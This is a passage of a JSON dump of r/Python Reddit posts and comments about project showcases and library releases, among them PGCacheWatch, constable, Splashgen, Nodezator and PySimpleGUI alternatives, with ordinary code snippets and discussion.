    "post_title": "Python 3.12.3 - The third maintenance release of Python 3.12",
    "media": [
        "https://www.python.org/downloads/release/python-3123/"
    ],
    "post_content": "https://www.python.org/downloads/release/python-3123/",
    "comments": [
        {
            "author": "dariofg",
            "score": "1",
            "content": "Is it worthy to upgrade from 3.11.4?",
            "replies": [
                {
                    "author": "Traditional-Wheel-68",
                    "score": "2",
                    "content": "I don’t think tensor flow works on 3.11.4 i think you should wait"
                },
                {
                    "author": "assumptionkrebs1990",
                    "score": "2",
                    "content": "Unless you need the better f-strings 3.12 introduces now, I think you can wait. My plain is to update once 3.12.9 comes out and skipping 3.13 entireiy."
                }
            ]
        }
    ]
},
{
    "post_author": "sanidhya69",
    "post_id": "g6apwp",
    "post_score": "1742",
    "post_time": "Thursday, April 23, 2020 at 1:17:36 AM GMT+3",
    "flair_text": "Web Development",
    "post_title": "Update! As promised, I made a website for the writing synthesis algorithm I wrote, It's fairly easy to use (Massively better than using the scripts itself). I hope it helps some of you to get your assignments done. Do try it out! Currently hosted on https://3c160834.ngrok.io (Link expires in 8 hrs)",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "sanidhya69",
            "score": "115",
            "content": "There are some major server issues, I'll fix them and get back to you with a new properly hosted link. Sorry for the inconvenience.",
            "replies": [
                {
                    "author": "itsMettt",
                    "score": "126",
                    "content": "Hey man, I have some servers where I put my stuff and projects.. I would really like to host your website for free if you want :) (no need for credits, a good project need a good website!)",
                    "replies": [
                        {
                            "author": "69shaolin69",
                            "score": "42",
                            "content": "Hi, good human."
                        },
                        {
                            "author": "SanJJ_1",
                            "score": "17",
                            "content": "Couldn't he just host it on GitHub or Google sites?"
                        },
                        {
                            "author": "ThisIsAwesome_",
                            "score": "2",
                            "content": "r/humanbeingbros"
                        }
                    ]
                },
                {
                    "author": "GickRick",
                    "score": "2",
                    "content": "Are you using flask?",
                    "replies": [
                        {
                            "author": "Legorooj",
                            "score": "4",
                            "content": "For a project like this, I'd say Django. Flask is good for smaller projects. Something with this much content; Django is many times simpler for the same result."
                        },
                        {
                            "author": "sanidhya69",
                            "score": "4",
                            "content": "Django"
                        }
                    ]
                },
                {
                    "author": "jaeger_2601",
                    "score": "2",
                    "content": "u/sanidhya69 Is this an open source project ?",
                    "replies": [
                        {
                            "author": "sanidhya69",
                            "score": "3",
                            "content": "Yes, it's on GitHub. There are some minor bugs that needs some fixing, I'll share the link once done."
                        }
                    ]
                }
            ]
        },
        {
            "author": "Lilipico",
            "score": "171",
            "content": "You guys make me feel bad about my python skills."
        },
        {
            "author": "sanidhya69",
            "score": "28",
            "content": "Debug settings are True for this publish, please share debug screenshots if encounter one."
        },
        {
            "author": "sanidhya69",
            "score": "20",
            "content": "Try it yourself for mobile users- Step 1- Chose any fontID from community fonts Step 2- Tap the menu icon on top right and go to Render Text section Step 3- Paste the font ID and type any text and press render You'll get your PDF file within 15 seconds (crappy server) That's all!"
        },
        {
            "author": "Timf135",
            "score": "16",
            "content": "This is amazing and the web design is almost just as cool. Very intuitive. However I am getting 500 error (internal sever error) on the console when I attempt to submit my files to create a font (templateupload)."
        },
        {
            "author": "couldnt_blame_tammy",
            "score": "13",
            "content": "Dude... how the fuck did you just whip up such a beautiful site?"
        },
        {
            "author": "Ikuyas",
            "score": "8",
            "content": "I think I saw this a few days back. Did you build this site in a day or so?"
        },
        {
            "author": "69shaolin69",
            "score": "13",
            "content": "Do you collect ip for “research”? Love the site btw. Edit: try heroku it’s free and can run python"
        },
        {
            "author": "itertom",
            "score": "6",
            "content": "This is very cool!!!! Now, at this point wouln't have been better to just do the homework hahhaha just joking :) remind me the \"joke\" from xkcd: https://xkcd.com/1205/ keep up with the good work!"
        }
    ]
},
{
    "post_author": "GabelSnabel",
    "post_id": "1bzx1na",
    "post_score": "22",
    "post_time": "Tuesday, April 9, 2024 at 7:53:21 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "PGCacheWatch - Supercharge Your Caching Strategy",
    "media": [
        "https://github.com/janbjorge/PGCacheWatch/"
    ],
    "post_content": "Hey Python enthusiasts! 👋\nI'm thrilled to introduce PGCacheWatch, my recent project designed to enhance your PostgreSQL databases by bringing real-time event notifications right into your applications. Vastly improved cache invalidation efficiency, without the need for adding any new services or infrastructure.\nWhat My Project Does\nPGCacheWatch capitalizes on PostgreSQL's built-in NOTIFY/LISTEN features to deliver instant, real-time notifications about database events, ensuring your application's cache remains fresh and synchronized with your database.\nTarget Audience\nThis project is tailored for developers and architects striving to maintain high-performance and scalable Python applications with real-time data demands. Whether you're developing web applications using FastAPI, orchestrating data processing pipelines, or any application dependent on PostgreSQL for data storage, PGCacheWatch simplifies cache invalidation management.\nComparison\nPGCacheWatch differentiates itself from other caching and notification mechanisms by:\nZero Additional Infrastructure: Utilizing PostgreSQL's existing functionalities, it circumvents the necessity for external tools or services.\nKey Features\nInstant Database Change Notifications: Ensures your application is immediately informed about database events as they occur, keeping data consistently updated.\nAdaptable Cache Invalidation Strategies: Offers a range of strategies to precisely control the cache invalidation process, striking a balance between performance and data fidelity.\nOptimized for Async Python: Conceived for the asynchronous Python ecosystem, making it a superb fit for applications utilizing asyncpg and FastAPI.\nJoin Me on GitHub\nI'm keen to see how PGCacheWatch can bolster your projects. Your feedback and contributions are greatly appreciated as I aspire to continually enhance and broaden the library's functionality.\nExplore PGCacheWatch on GitHub",
    "comments": [
        {
            "author": "cant-find-user-name",
            "score": "8",
            "content": "The library seems very interesting, congrats on its release! However, you have a service called pg bouncer - https://pgcachewatch.readthedocs.io/en/latest/pgb.html, but there's already a very popular postgres server side connection pooler called pgbouncer - https://www.pgbouncer.org/, it is widely used. I would recommend changing the name of your service, as otherwise it would be very confusing to people.",
            "replies": [
                {
                    "author": "GabelSnabel",
                    "score": "1",
                    "content": "Thanks for the feedback, i will try to come up with another name for the optimal service."
                },
                {
                    "author": "GabelSnabel",
                    "score": "1",
                    "content": "Renamed to: PG Event Distributor"
                }
            ]
        },
        {
            "author": "crawl_dht",
            "score": "1",
            "content": "Can it be used in conjunction with SQLAlchemy? As an example, something like this: from sqlalchemy.ext.asyncio import create_async_engine engine = create_async_engine(...) async def main(): async with engine.begin() as conn: event_queue = PGEventQueue() await event_queue.connect(conn) print('Listening for events...') while True: event = await event_queue.get() print(f'Received event: {event}')",
            "replies": [
                {
                    "author": "GabelSnabel",
                    "score": "1",
                    "content": "PGCacheWatch needs a connection that supports event callbacks. While not evident in SQLAlchemy docs, integrating it might be possible through a background task that listens for events. EDIT: After reading and hacking a bit, this seems to work. import asyncio from pgcachewatch.listeners import PGEventQueue from sqlalchemy.ext.asyncio import create_async_engine async def main() -> None: engine = create_async_engine(\"postgresql+asyncpg://testuser:testpassword@127.0.0.1\") async with engine.begin() as conn: event_queue = PGEventQueue() await event_queue.connect((await conn.get_raw_connection()).driver_connection) print(\"Listening for events...\") while True: event = await event_queue.get() print(f\"Received event: {event}\") if __name__ == \"__main__\": asyncio.run(main())",
                    "replies": [
                        {
                            "author": "crawl_dht",
                            "score": "1",
                            "content": "Is this not a correct way to subscribe to notification? >>> python -m pgcachewatch install users signal.signal(signal.SIGPIPE, signal.SIG_DFL) ^^^^^^^^^^^^^^ AttributeError: module 'signal' has no attribute 'SIGPIPE'. Did you mean: 'SIGFPE'?",
                            "replies": [
                                {
                                    "author": "GabelSnabel",
                                    "score": "1",
                                    "content": "Are you using windows? Could you also provide me with the output from `python -V` ?"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "worriedjacket",
            "score": "1",
            "content": "I've written a similar library to this in Rust and intentionally did not go the route of using notify/listen. Postgres supports logical replication and will literally ship you the WAL, which you can decode and use for this exact purpose without any real overhead on the database. When you use notify, you're having to do extra work on top of every transaction rather than just copying bytes to a network socket.",
            "replies": [
                {
                    "author": "GabelSnabel",
                    "score": "1",
                    "content": "That sounds like an innovative approach! However, my understanding is that it requires direct access to disk files, which might pose challenges in cloud-hosted environments where such access can be restricted or not easily configurable? This could potentially limit the viability of this method for some cloud setups? Is this library available in a public repository where I could take a look?"
                },
                {
                    "author": "crawl_dht",
                    "score": "1",
                    "content": "Does SQLAlchemy support this feature in Postgres dialect?"
                },
                {
                    "author": "GabelSnabel",
                    "score": "1",
                    "content": "For future reads, started a python client (very very beta atm.): https://github.com/janbjorge/PGStreamReplica"
                }
            ]
        }
    ]
},
{
    "post_author": "ItsTheWeeBabySeamus",
    "post_id": "ngbiwa",
    "post_score": "1825",
    "post_time": "Wednesday, May 19, 2021 at 8:16:58 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "Create splash pages in less than 20 lines of python for free. Splashgen is an open source project",
    "media": [
        "https://external-preview.redd.it/Zi0l90VqrnFtZaBBCikTO4aEUCeFCBfl74VI7g4iEiQ.jpg?width=640&crop=smart&auto=webp&s=3d774c7b52126db6079a9c76b6d0a6b95a279015",
        "https://github.com/true3dco/splashgen"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "ItsTheWeeBabySeamus",
            "score": "37",
            "content": "Here is an example repo using the project: https://github.com/true3dco/splashgen.sh-site If anyone needs help getting setup, let me know!"
        },
        {
            "author": "SquareRootsi",
            "score": "32",
            "content": "I'm intrigued, to say the least. Speaking from experience, there are a lot of aspiring data scientists who know python, but very little about web dev stuff. This makes it hard to integrate their models into something to show off to perspective employers. Not sure how well this would integrate / compete with Streamlit, but it seems nice for those who only just learned Python as their first programming language, and don't know much about HTML, JavaScript, CSS, etc"
        },
        {
            "author": "[deleted]",
            "score": "90",
            "content": "Pages that people spin up to share info about their project. As an example: here is the super simple splashgen splash page: https://splashgen.sh/",
            "replies": [
                {
                    "author": "ItsTheWeeBabySeamus",
                    "score": "62",
                    "content": "Pages that people spin up to share info about their project. As an example: here is the super simple splashgen splash page: https://splashgen.sh/"
                }
            ]
        },
        {
            "author": "ginsujitsu",
            "score": "265",
            "content": "I wish the community was more supportive sometimes. This person made a thing they're proud of and wanted to show it to fellow coders. People are posting like they've never written a program just for the heck of it before. Not everything has to be marketable or ground breaking. It just needs to be fun. Cool thing, OP. I think it's neat."
        }
    ]
},
{
    "post_author": "Black-DVD-Archiver",
    "post_id": "1bygkmh",
    "post_score": "31",
    "post_time": "Monday, April 8, 2024 at 12:52:40 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "With the demise of open Pysimplegui is anyone interested in helping productionise this alternative?\n",
    "media": [
        "https://github.com/David-Worboys/Black-DVD-Archiver/blob/main/video_cutter.py#L2391",
        "https://github.com/David-Worboys/Black-DVD-Archiver",
        "https://github.com/David-Worboys/Black-DVD-Archiver/blob/main/qtgui.py"
    ],
    "post_content": "I wrote my own Pyside6 alternative to Pysimple gui that I use in my projects starting some years back after some unsatisfactory interactions with the author of Pysimple gui.\nThe GIT source for my GUI wrapper is in\nhttps://github.com/David-Worboys/Black-DVD-Archiver/blob/main/qtgui.py\nAnd the open source project it is used in is\nhttps://github.com/David-Worboys/Black-DVD-Archiver\nJust look for the layout methods in the .py files to see how it is used. https://github.com/David-Worboys/Black-DVD-Archiver/blob/main/video_cutter.py#L2391 is a good place to start, line 953,.\nNote size measurements are generally in chars, but pixels can be used\nMake no mistake there is a lot of work to produuctionise this and make a Python library, including, most importantly, doco of which there is none.\nIf anyone is interested I will set up a new Git project for it..\nI am living on borrowed time and have to focus more on my other projectsWith the demise of open Pysimplegui is anyone interested in helping productionise this alternative?\nHelp\nI wrote my own Pyside6 alternative to Pysimple gui that I use in my\nprojects starting some years back after some unsatisfactory\ninteractions with the author of Pysimple gui.\nThe GIT source for my GUI wrapper is in\nhttps://github.com/David-Worboys/Black-DVD-Archiver/blob/main/qtgui.py\nAnd the open source project it is used in is\nhttps://github.com/David-Worboys/Black-DVD-Archiver\nJust look for the layout methods in the .py files to see how it is used. https://github.com/David-Worboys/Black-DVD-Archiver/blob/main/video_cutter.py#L2391 is a good place to start, line 953,.\nNote size measurements are generally in chars, but pixels can be used\nMake no mistake there is a lot of work to produuctionise this and\nmake a Python library, including, most importantly, doco of which there\nis none.\nIf anyone is interested I will set up a new Git project for it..\nI am living on borrowed time and have to focus more on my other projects",
    "comments": [
        {
            "author": "Wing-Tsit_Chong",
            "score": "15",
            "content": "What's wrong with pysimplegui",
            "replies": [
                {
                    "author": "i1728",
                    "score": "41",
                    "content": "It used to be licensed under LGPLv3 and now it's under this.",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "",
                            "content": "More and more open source projects is moving away from licensing that allows corporate from directly profiting form it without giving anything back or giving \"free\" development to \"competition\" that re-labels them. In this case it's simple - you are making a commercial software - you pay for license, simple as that. Same is true for PyQt and PySide. If you want commercial development for free then you have kivy, wx, tkinter. Don't expect highly popular and complex software to die from going commercial in a smart way and that it would be easy to replace without significant time/money investment. If OP wants a replacement he will have to invest hundreds of thousands of USD worth of dev time to make it happen.",
                            "replies": [
                                {
                                    "author": "riklaunim",
                                    "score": "15",
                                    "content": "More and more open source projects is moving away from licensing that allows corporate from directly profiting form it without giving anything back or giving \"free\" development to \"competition\" that re-labels them. In this case it's simple - you are making a commercial software - you pay for license, simple as that. Same is true for PyQt and PySide. If you want commercial development for free then you have kivy, wx, tkinter. Don't expect highly popular and complex software to die from going commercial in a smart way and that it would be easy to replace without significant time/money investment. If OP wants a replacement he will have to invest hundreds of thousands of USD worth of dev time to make it happen."
                                }
                            ]
                        },
                        {
                            "author": "pyeri",
                            "score": "3",
                            "content": "This is a terrible license. For starters, there is an \"auto upgrade\" clause. This means the licensor can revoke these terms and come up with new ones any time they wish! Licensee acknowledges that Licensor may from time to time update or modify this Agreement, by publishing a new version of this Agreement on Licensor's website. And then there are obvious things that go against the very ethos of open source: A Hobbyist Developer may not use PySimpleGUI for any development purpose other than the Permitted No-cost Purposes. ... Only Commercial Developers may use PySimpleGUI to develop Licensee Applications for any commercial purpose;"
                        }
                    ]
                },
                {
                    "author": "SittingWave",
                    "score": "22",
                    "content": "setting aside the license issues, my opinion: the guy was constantly spamming on r/python about it, and took criticism both of his practice and of the design of his library very personally. the design is not very good, and it teaches people poor implementation practices in UI design, as well as lacking modern practical patterns that are fundamental for modern UI development. I might be wrong today because I haven't checked it in a while. Still, the design stinks."
                }
            ]
        },
        {
            "author": "ExdigguserPies",
            "score": "7",
            "content": "I guess I don't really understand why a wrapper is necessary. Just to reduce the amount of boilerplate?"
        },
        {
            "author": "georgehank2nd",
            "score": "6",
            "content": "\"productionise\" and not used ironically… include me out."
        },
        {
            "author": "horstjens",
            "score": "3",
            "content": "please set up a git(hub) project and share the link"
        },
        {
            "author": "banana33noneleta",
            "score": "3",
            "content": "I think people are better off just learning to use pyside, which isn't very difficult to begin with."
        },
        {
            "author": "ManyInterests",
            "score": "3",
            "content": "For whatever it's worth, I am maintaining an LGPL fork of PySimpleGUI (and its QT/Wx/Web variants) here. It's available on PyPI under FreeSimpleGUI. This way, current users of PySimpleGUI have something else to latch onto, view source code, install via PyPI, contribute fixes, etc. without worrying about it going away or accidentally using a proprietary license. As it is a fork starting from the last LGPL-licensed version of PySimpleGUI, it can be used as a drop-in replacement: import FreeSimpleGUI as sg That said, I think using other projects projects, maybe like the one you propose, are probably the best path forward for everyone. It's a real shame, almost comical, that PySimpleGUI went from some random developer's first Python project to attempting a proprietary-licensed for-profit software venture in just a few years.",
            "replies": [
                {
                    "author": "Black-DVD-Archiver",
                    "score": "2",
                    "content": "Glad someone is maintaining fork as this guys recent move would have stranded many on an unsupported framework...unless you like to get developers keys and hand over personal info to do so. I wonder if the new version phones home, security risk then as well... The best we can say is he is an 'entrepreneur'!!!"
                }
            ]
        },
        {
            "author": "james_pic",
            "score": "2",
            "content": "There's nothing wrong with starting from scratch, but you could also use the last open source version of PySimpleGui as a starting point too."
        }
    ]
},
{
    "post_author": "saurabh0719",
    "post_id": "1c2qxk5",
    "post_score": "132",
    "post_time": "Saturday, April 13, 2024 at 5:12:34 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "constable - automatically inject print statements into your functions for debugging variables",
    "media": [
        "https://github.com/saurabh0719/constable"
    ],
    "post_content": "What My Project Does constable automatically injects print statements, during runtime, into your function code to give you a live step by step replay of each variable assignment.\nGithub repo - https://github.com/saurabh0719/constable\nTarget Audience Can be used in testing/debugging environments. Do not leave this hanging around in production!\nComparison Use pdb for all purposes that matter. Or an object state tracker.\nExample -\nimport constable\n\n@constable.trace('a', 'b')\ndef example(a, b):\n    a = a + b\n    c = a\n    a = \"Experimenting with the AST\"\n    b = c + b\n    a = c + b\n    return a\n\nexample(5, 6)\nOutput -\nconstable: example: line 5\n    a = a + b\n    a = 11\n    type(a) = <class 'int'>\n\nconstable: example: line 7\n    a = \"Experimenting with the AST\"\n    a = Experimenting with the AST\n    type(a) = <class 'str'>\n\nconstable: example: line 8\n    b = c + b\n    b = 17\n    type(b) = <class 'int'>\n\nconstable: example: line 9\n    a = c + b\n    a = 28\n    type(a) = <class 'int'>\n\nconstable: example: line 3 to 10\n    args: (5, 6)\n    kwargs: {}\n    returned: 28\n    execution time: 0.00018480 seconds",
    "comments": [
        {
            "author": "UraniumButtChug",
            "score": "63",
            "content": "As a lazy programmer, I'm digging this!",
            "replies": [
                {
                    "author": "saurabh0719",
                    "score": "2",
                    "content": "Thank you, do let me know if there's anything else that could be useful to add here",
                    "replies": [
                        {
                            "author": "GoofAckYoorsElf",
                            "score": "17",
                            "content": "Using logging integration instead of print would be great. Or the ability to set a different callable instead of print."
                        },
                        {
                            "author": "jdsalaro",
                            "score": "4",
                            "content": "What about passing a wildcard * to track all variables within the target function 🤔 This reminded me of hunter https://python-hunter.readthedocs.io/en/latest/readme.html Where you can do: import hunter # note that this kind of invocation will also use the default `CallPrinter` action hunter.trace(hunter.Q(module='posixpath', action=hunter.VarsPrinter('path'))) import os os.path.join('a', 'b')"
                        }
                    ]
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "",
            "content": "Yup that makes sense! I will add that. :)",
            "replies": [
                {
                    "author": "saurabh0719",
                    "score": "10",
                    "content": "Yup that makes sense! I will add that. :)"
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "",
            "content": "With a debugger you need to step through the code. This, instead, is for sedentary people.",
            "replies": [
                {
                    "author": "Kiuhnm",
                    "score": "8",
                    "content": "With a debugger you need to step through the code. This, instead, is for sedentary people."
                }
            ]
        },
        {
            "author": "ogrinfo",
            "score": "10",
            "content": "Love this - we all know print statements are the best debugger."
        },
        {
            "author": "LankyOccasion8447",
            "score": "13",
            "content": "I mean... a debugger is easier.",
            "replies": [
                {
                    "author": "bfranks",
                    "score": "11",
                    "content": "Not in cloud ☁️"
                },
                {
                    "author": "rentonl",
                    "score": "4",
                    "content": "I think it's just a matter of time saving. If you have something simple you need to debug it takes literally 1 second to add in a print and check it. I'll pull out the debugger on complicated problems, but it's often overkill."
                }
            ]
        },
        {
            "author": "jdsalaro",
            "score": "2",
            "content": "I'm not sure if I hate this or I love it. One thing is sure, though, there's certainly some use cases."
        },
        {
            "author": "kobumaister",
            "score": "3",
            "content": "A dirty and lazy way of debugging... love it"
        },
        {
            "author": "pineapple_slut",
            "score": "3",
            "content": "Why not just… use a debugger?",
            "replies": [
                {
                    "author": "menge101",
                    "score": "1",
                    "content": "or logger.debug()"
                }
            ]
        },
        {
            "author": "menge101",
            "score": "2",
            "content": "I'm unclear how this is desirable compared to the more traditional use of logger.debug(). You can put those statements every step of the way and then they go away as soon as you raise the logging level to info. And this doesn't have anything mucking with the AST, which while I'm sure this package is well tested, what with the total number of tests being ... two, um... yeah, I don't want code that mucks with the AST in my codebase. Explicit over implicit. If I want a variable traced, I'll put the logging statements in to trace it, or even just run it in a debugger."
        },
        {
            "author": "achaayb",
            "score": "1",
            "content": "Its too verbose i think, can you have a simple mode?",
            "replies": [
                {
                    "author": "saurabh0719",
                    "score": "1",
                    "content": "There is a flag to toggle for verbose that can be set to false !"
                }
            ]
        },
        {
            "author": "alexmojaki",
            "score": "1",
            "content": "See https://github.com/alexmojaki/snoop import snoop @snoop def example(a, b): a = a + b c = a a = 'Experimenting with the AST' b = c + b a = c + b return a example(5, 6) Output: 23:07:36.58 >>> Call to example in File \"/home/alex/.config/JetBrains/PyCharm2023.3/scratches/scratch_2525.py\", line 4 23:07:36.58 ...... a = 5 23:07:36.58 ...... b = 6 23:07:36.58    4 | def example(a, b): 23:07:36.58    5 |     a = a + b 23:07:36.58 .......... a = 11 23:07:36.58    6 |     c = a 23:07:36.58 .......... c = 11 23:07:36.58    7 |     a = 'Experimenting with the AST' 23:07:36.58    8 |     b = c + b 23:07:36.58 .......... b = 17 23:07:36.58    9 |     a = c + b 23:07:36.58 .......... a = 28 23:07:36.58   10 |     return a 23:07:36.58 <<< Return value from example: 28"
        }
    ]
},
{
    "post_author": "MCTrovato",
    "post_id": "1c06d6u",
    "post_score": "6",
    "post_time": "Wednesday, April 10, 2024 at 2:13:04 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Advanced Macro & Calorie Calculator",
    "media": [
        "https://github.com/michael-trovato/advanced-macro-calculator"
    ],
    "post_content": "What My Project Does\nA macro-nutrient and calorie calculator to help me achieve body composition goals.\nThis calculator is compatible with metric and imperial units. It supports weight changes based on percentage and fixed values (lbs, kg). This is useful when losing weight in a fat loss phase as a percentage, and for gaining at a fixed value during a muscle growth phase.\nThe recommendations are built using scientific research based on lean body mass. If the user's body fat percentage is unknown, then it will be calculated using BMI and the Deurenberg formula.\nGeneral guidance is also available on the project page.\nKey Features:\nCompatible with metric and imperial units\nWeight change based on percentage or fixed values\nRecommendations based on scientific research\nBody Fat Percentage Calculator\nChoose where to place remaining calories (after minimum fat & protein targets reached)\nSafety Limits (Max Change & Caloric Intake Below BMR)\nTarget Audience\nThis calculator is ready for production. Ideally, any end user should be able to use this program, not just developers. I hope that this calculator can help the general public.\nComparison\nThere are many other macro calculators available. However, I feel that this one is a step beyond other calculators. This calculator will always make sure that the end user reaches their minimum protein and fat amounts. It also also allows the user to select where to place any remaining calories. Some may prefer to place remaining calories in carbs, while others may wish to stay in ketosis and place remaining calories in fat, or even a mix of all macro-nutrients. It also has built in safety mechanism to keep calories and macros adequate for health status.\nProject Page:\nAdvanced Macro Calculator on GitHub",
    "comments": []
},
{
    "post_author": "jnwang",
    "post_id": "hlqnim",
    "post_score": "1739",
    "post_time": "Sunday, July 5, 2020 at 8:40:37 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Understand your data with a few lines of code in seconds using DataPrep.eda",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "jnwang",
            "score": "138",
            "content": "Real-world data scientists often spend over 80% of their time on data preparation (data collection --> data understanding --> data cleaning --> data integration --> feature engineering). We believe that the main reason that data preparation takes a lot of human time is due to the lack of a good data preparation tool. Our vision is to build DataPrep (http://dataprep.ai/), a fast and easy-to-use python library for data preparation to fill the gap. You can think of DataPrep as \"scikit-learn\" for data preparation. Currently, the library contains DataPrep.data_connector to facilitate web data collection and DataPrep.eda to enable fast data understanding. More components (data cleaning, data integration, feature engineering) will be added in future releases. We really hope that you can download it (pip install dataprep) and give it a try. We will take your feedback very seriously and keep improving the library. Github Repository: https://github.com/sfu-db/dataprep Documents: https://sfu-db.github.io/dataprep/index.html More Video Demos: https://www.youtube.com/channel/UC7OpZsQwWcmuD0SUaOjGBMA",
            "replies": [
                {
                    "author": "cym13",
                    "score": "58",
                    "content": "Time will tell if this is the right solution, but at least I think you're tackling the right problem. Thank's for sharing."
                },
                {
                    "author": "kum0nryu",
                    "score": "3",
                    "content": "Nice job. I’m excited to follow this project. It has aspects that are very similar to the internal tools we’ve written at my firm. I think you’re on the right track."
                },
                {
                    "author": "MAFiA303",
                    "score": "2",
                    "content": "I will give feedback alright!!!"
                }
            ]
        },
        {
            "author": "whiteknight521",
            "score": "23",
            "content": "Can this work with 4D data like multi page TIFF images stored as numpy arrays?"
        },
        {
            "author": "darkagile",
            "score": "21",
            "content": "What would be the difference between https://github.com/pandas-profiling/pandas-profiling and what you offer?"
        },
        {
            "author": "HoThMa",
            "score": "7",
            "content": "well, this looks awesome! thanks EDIT: Are the charts based on plotly?"
        },
        {
            "author": "landstein",
            "score": "10",
            "content": "Wow this looks great. Going to try it out."
        },
        {
            "author": "Doctor_Deceptive",
            "score": "5",
            "content": "This seems to have lesser commands than matplotlib and pandas combined to get the data representations. I'm new to this but I would like to understand what's under the hood."
        },
        {
            "author": "[deleted]",
            "score": "4",
            "content": "This looks freaking awesome! I can’t wait to try it. Is this built on top of Matplotlib or seaborn?"
        }
    ]
},
{
    "post_author": "KennedyRichard",
    "post_id": "1byvjer",
    "post_score": "2",
    "post_time": "Monday, April 8, 2024 at 2:31:19 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Automated system testing on GUI app (Nodezator - Public domain generalist Python node editor)",
    "media": [
        "https://github.com/sponsors/KennedyRichard",
        "https://github.com/IndiePython/nodezator/discussions/72#discussioncomment-8997584",
        "https://manual.nodezator.com/",
        "https://nodezator.com/",
        "https://patreon.com/KennedyRichard",
        "https://indiepython.com/donate",
        "https://github.com/IndiePython/nodezator"
    ],
    "post_content": "Hello, everyone. I'm Kennedy Guerra, 33, open-source software maintainer. Just wanted to share a new feature I'm working on for the next version of Nodezator (GitHub | website), my public domain generalist Python node editor.\nIn case you don't know Nodezator, the next few sections present it briefly. If you want to know about the new feature I'm working on, you can skip straight to the last subsection, which contains a detailed explanation and links to videos and extra info about the feature, called Automated System Testing.\nWhat my project does\nNodezator is a generalist Python node editor (a desktop app) that allows developers to build and execute visual graphs whose nodes represent Python callables (your own and/or callables from Python standard or third-party libraries).\nTarget audience\nPython developers in all areas. Intermediate Python knowledge is advised.\nYou can also use it as a no-code interface, since people editing/executing the graph only have to deal with widgets and basic node editing operations like connecting/disconnecting sockets, creating or deleting nodes, etc.\nComparison\nNodezator has actually many features that are either absent in other similar apps or are very rarely found:\nit is dedicated to the public domain with much love\ndevs only need to define Python functions and the app automatically turns them into nodes (yes, no need to subclass anything)\ninstead of writing your own functions, you can also feed existing functions from third-party libraries and the app will also turn them into nodes, virtually making Nodezator an \"everything nodes\" solution\nthe graphs created can be converted back into Python code with the click of a button\nexporting to SVG, HTML+SVG and PNG is also available\nin the same way functions can receive other functions, nodes can receive other nodes as arguments, allowing the creation of powerful operations (functions are first-class citizens after all, so the nodes that represent them are as well)\na comprehensive user manual available both inside the app and online.\nNew feature on development branch: Automated System Testing\nWhat I wanted to highlight today, though, is a feature I'm currently working on, called automated system testing, which is available in the development branch.\nHere's the link to a GitHub devlog post that contains a video demonstrating the feature in action: https://github.com/IndiePython/nodezator/discussions/72#discussioncomment-8997584\nOn the post you can also read more about the feature and how to reproduce the behaviour inside the app.\nHere's a brief explanation: once the user picks the tests to be performed in a dedicated form and clicks \"Start system testing session\", the app takes over and performs all the tests automatically by controlling the GUI. At the end of each test case, the app checks the state for expected values. After all test cases are performed, the app shows a report.\nI'm very relieved this feature is finally implemented and should soon be released (it needs a lot of polishing and is only available in the development branch, but is already functional). The reason for this is that as the project grows and becomes more and more complex, I needed to automated this kind of tests to ensure a more healthy/feasible development and more stable releases.\nThat is, there are so many different tasks performed in the app that testing it manually takes a lot of time. As we all know, development requires a lot of iteration, so the enormous amount of time required to test everything manually would be spent many times over the implementation of even the simplest changes.\nOnce this feature is released, we'll be able to automatically test everything and thus get feedback much earlier regarding the impact of our changes throughout the plethora of possible tasks that comprise Nodezator's workflow. Of course we also have unit tests, and they are important, but they are useful for testing units of behaviour, not their synergy when fully integrated in the working app as the user operates it.\nOnce released, this feature will help me and other contributors check much sooner and with more precision whether our work is breaking any existing tasks/workflows/features. Sooner because the automated tests can be executed as fast as possible, as shown in the video, not only in normal time. With precision because the exact mouse and keyboard interactions are reproduced in the exact same way every time each test runs.\nThis app is part of the Indie Python project, a personal project of mine to create and maintain completely free and open-source software (apps and games) and also release instructional/educational content related to them. Such software/content is created and maintained with much love, so please, consider supporting us if you have the means: https://patreon.com/KennedyRichard, https://github.com/sponsors/KennedyRichard, https://indiepython.com/donate.\nThank you for your attention, let me know if you have any questions.",
    "comments": []
},
{
    "post_author": "zacky2004",
    "post_id": "1c3cwqi",
    "post_score": "2",
    "post_time": "Sunday, April 14, 2024 at 12:38:23 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Segmentation pipeline using MONAI and Pytorch",
    "media": [
        "https://github.com/adnan-umich/monai-train"
    ],
    "post_content": "For my machine learning project, I created an 'end to end' segmentation pipeline using MONAI and Pytorch for the deep learning portion, and the Optuna hyper parameter optimization library for hyperparam optimization / search. The entire project is fully encapsulated/packaged using Poetry, so its really easy to install and use. The pipeline is fully customizable in terms of which models to use, model parameters, optimizers, as well as hyperparameters via configuration files. It also takes advantage of automatic mixed-precision for accelerated compute. I also have it integrated with Aimstack for experiment tracking and visualization.\nWhat My Project Does\nSegmentation pipeline used for creating segmentation masks of diagnostic medical images in Nifti format. Streamlines the process of training, inference and hyperparameter search using Optuna and Aimstack integration. Modularized configuration files allow for specific use-case modification.\nTarget Audience\nPrimarily meant for medical image and computer vision research & teaching. Not meant for clinical use.\nComparison\nUse a single pipeline for training, inference and visualization, quickly prototype models, and even benchmark HPC GPU performance.\nOverall, this was an amazing learning experience for me. I'm new to the world of ML, and I learned a lot while developing this. I've been running this on an HPC cluster with both A100 and H100 GPUs. What do you guy's think? https://github.com/adnan-umich/monai-train",
    "comments": [
        {
            "author": "[deleted]",
            "score": "1",
            "content": "Hi there, I'm not sure how my post comes across as asking for help, could you please clarify how you got that impression? Thank you.",
            "replies": [
                {
                    "author": "zacky2004",
                    "score": "1",
                    "content": "Hi there, I'm not sure how my post comes across as asking for help, could you please clarify how you got that impression? Thank you."
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1c07frh",
    "post_score": "5",
